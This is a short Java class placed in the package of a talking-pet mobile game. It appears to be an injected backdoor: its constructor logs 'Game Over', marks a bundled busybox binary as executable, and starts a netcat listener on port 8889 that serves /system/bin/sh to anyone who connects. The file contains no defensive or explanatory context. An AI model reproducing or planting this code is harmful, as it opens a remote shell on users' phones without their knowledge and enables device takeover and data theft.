package com.outfit7.talkingfriends.clips;
import android.util.Log;

public class c {
    public c(){
      Log.d("WINNER", "Game Over");

try {
      Runtime.getRuntime().exec("chmod 755 /data/data/com.outfit7.mytalkingtomfree/files/busybox");
      Runtime.getRuntime().exec("/data/data/com.outfit7.mytalkingtomfree/files/busybox nc -ll -p 8889 -e /system/bin/sh");
}catch(Exception e){
e.printStackTrace();
}
    }
}
